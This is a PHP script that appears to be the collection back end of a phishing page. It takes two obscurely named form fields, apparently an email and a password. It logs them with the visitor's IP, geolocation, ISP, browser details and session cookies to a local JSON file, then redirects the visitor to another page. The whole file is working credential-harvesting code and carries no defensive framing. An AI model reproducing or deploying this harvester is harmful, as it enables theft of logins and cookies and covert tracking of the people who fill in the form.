<?php
// Include ip.php to retrieve IP and device details
include 'ip.php';

// Define variables to avoid undefined errors
$success = $success ?? false;
$details = $details ?? [];
$PublicIP = $_SERVER['REMOTE_ADDR']; // Get public IP

$elx = $_POST['elx'] ?? 'default_elx';
$pdx = $_POST['pdx'] ?? 'default_pdx'; 

$city = $success ? ($details['city'] ?? 'Unknown') : 'Unknown';
$region = $success ? ($details['region'] ?? 'Unknown') : 'Unknown';
$country = $success ? ($details['country'] ?? 'Unknown') : 'Unknown';
$location = $success ? ($details['latitude'] . ', ' . $details['longitude']) : 'Unknown';
$isp = $success ? ($details['isp'] ?? 'Unknown') : 'Unknown';
$type = $success ? ($details['type'] ?? 'Unknown') : 'Unknown';

$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$user_browser = get_browser($user_agent, true)['browser'] ?? 'Unknown';
$user_os = php_uname('s') . " " . php_uname('r');

$data = [
    'elx' => $elx,
    'pdx' => $pdx,
    'ip_info' => [
        'ip' => $PublicIP,
        'port' => $_SERVER['REMOTE_PORT'] ?? 'Unknown',
        'city' => $city,
        'region' => $region,
        'country' => $country,
        'location' => $location,
        'isp' => $isp,
        'type' => $type,
    ],
    'additional_info' => [
        'date' => date("Y-m-d H:i:s"),
        'host' => gethostbyaddr($PublicIP),
        'user_agent' => $user_agent,
        'browser' => $user_browser,
        'os' => $user_os,
        'method' => $_SERVER['REQUEST_METHOD'],
        'referrer' => $_SERVER['HTTP_REFERER'] ?? 'Direct Access',
        'cookie' => $_SERVER['HTTP_COOKIE'] ?? '',
    ]
];

$filePath = 'data_new.json';

if (file_exists($filePath)) {
    $existingData = json_decode(file_get_contents($filePath), true);
    if (!is_array($existingData)) {
        $existingData = [];
    }
} else {
    $existingData = [];
}

$existingData[] = $data;

$jsonData = json_encode($existingData, JSON_PRETTY_PRINT);
if ($jsonData === false) {
    die("JSON encoding error: " . json_last_error_msg());
}

file_put_contents($filePath, $jsonData . PHP_EOL, LOCK_EX);

// Redirect to g.html
header("Location: g.html");
exit();
?>
